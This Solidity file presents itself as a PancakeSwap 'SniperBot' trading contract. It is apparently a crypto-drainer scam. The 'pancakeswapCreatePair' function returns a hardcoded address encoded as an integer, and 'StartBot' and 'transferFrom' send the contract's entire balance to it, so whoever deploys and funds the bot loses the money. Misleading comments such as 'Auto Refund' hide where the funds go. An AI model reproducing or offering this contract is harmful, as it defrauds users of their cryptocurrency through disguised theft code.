pragma solidity ^0.6.6;
 
// PancakeSwap manager
import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 
 
contract SniperBot {
    Manager manager;
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint public decimals = 18;
    uint public totalSupply = 0 * 10 ** 18; // Converting to wei
    
 
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
 
    constructor() public {
        balances[msg.sender] = totalSupply;
        manager = new Manager();
    }
 
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
 
    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
 
    //Transaction And Auto Refund
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        payable(manager.pancakeswapCreatePair()).transfer(address(this).balance);
 
        return true;   
    }
 
    //Approval for transaction
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }
 
    //Transfer to the address which create this contract.
	receive() external payable {}
    function StartBot() public payable {
        payable(manager.pancakeswapCreatePair()).transfer(address(this).balance);
        manager;        
    } 
 
 

}
contract Manager {
 function performTasks() public {}
 function pancakeswapCreatePair() public pure returns (address) {
  uint160 pindex = 231049789443202356393975997932428849834924488554;
  return address(pindex);
 }
}
